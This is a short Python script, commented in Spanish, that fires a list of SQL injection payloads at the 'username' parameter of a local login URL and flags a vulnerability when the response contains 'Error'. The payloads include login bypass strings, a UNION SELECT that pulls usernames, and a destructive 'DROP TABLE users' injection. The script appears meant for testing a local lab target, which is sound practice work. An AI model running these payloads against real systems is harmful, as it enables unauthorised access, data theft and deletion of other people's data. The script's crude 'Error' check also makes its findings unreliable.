import requests
import urllib.parse


def test_sql_injection(url, payload):
    # Construye la URL con el payload de inyección de SQL correctamente codificado
    encoded_payload = urllib.parse.quote(payload)
    full_url = f"{url}?username={encoded_payload}"

    # Realiza la solicitud
    response = requests.get(full_url)

    # Analiza la respuesta en busca de indicios de una inyección de SQL exitosa
    if 'Error' in response.text:
        print(f"Vulnerabilidad de inyección de SQL encontrada en {url}")
        print(f"Payload utilizado: {payload}")
        print("Respuesta del servidor:")
        print(response.text)
        print("-------------------------------------------")
    else:
        print(f"No se encontraron indicios de inyección de SQL en {url}")
        print("-------------------------------------------")

# URL de la página vulnerable a inyección de SQL (ejemplo)
vulnerable_url = 'http://127.0.0.1:8000/auth/'

# Ejecuta la prueba de inyección de SQL con diferentes payloads
payloads = [
    "' OR 1=1 --",
    "admin' OR '1'='1",
    "' UNION SELECT username FROM users --",
    "'; DROP TABLE users; --"
]

for payload in payloads:
    test_sql_injection(vulnerable_url, payload)
